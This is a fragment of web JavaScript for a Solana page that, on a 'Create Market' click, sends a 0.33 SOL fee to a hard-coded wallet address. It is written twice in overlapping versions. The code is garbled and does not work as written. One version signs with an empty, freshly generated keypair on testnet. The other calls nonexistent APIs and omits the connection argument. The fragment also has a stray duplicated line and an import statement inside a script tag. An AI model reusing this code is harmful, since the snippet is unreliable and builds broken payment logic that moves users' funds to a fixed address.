// Function to handle the transaction
async function sendTransaction() {
  const { Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require("@solana/web3.js");

  let fromKeypair = Keypair.generate();
  let toAddress = "9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar"; // Your wallet address
  let transactionFee = 0.33 * LAMPORTS_PER_SOL; // Transaction fee in lamports

  let transaction = new Transaction();

  transaction.add(
    SystemProgram.transfer({
      fromPubkey: fromKeypair.publicKey,
      toPubkey: toAddress,
      lamports: transactionFee,
    }),
  );

  const { sendAndConfirmTransaction, clusterApiUrl, Connection } = require("@solana/web3.js");

  let connection = new Connection(clusterApiUrl("testnet"));

  // Send and confirm the transaction
  try {
    await sendAndConfirmTransaction(connection, transaction, [fromKeypair]);
    console.log("Transaction successful");
  } catch (error) {
    console.error("Transaction failed:", error);
  }
}

// Attach click event listener to the "Create Market" button
// Attach click event listener to the "Create Market" button
document.getElementById("createMarketButton").addEventListener("click", sendTransaction);
 sendTransaction);
<script>
    // Function to handle the click event of the "Create Market" button
    document.querySelector('.create-market').addEventListener('click', async () => {
        try {
            // Create a transaction to send 0.33 SOL to the specified wallet address
            // Replace the placeholder wallet address with your actual address
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: solanaWeb3.window.solana.publicKey,
                    toPubkey: '9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar',
                    lamports: 330000000, // 0.33 SOL in lamports
                })
            );

            // Send and confirm the transaction
            const signature = await solanaWeb3.sendAndConfirmTransaction(transaction, [window.solana]);
            // If transaction is successful, log a message
            console.log("Transaction successful! Signature:", signature);
        } catch (error) {
            // If an error occurs during the transaction process, log the error
            console.error("Error sending transaction:", error);
        }
    });
import * as buffer from "buffer";
window.Buffer = buffer.Buffer;
</script>

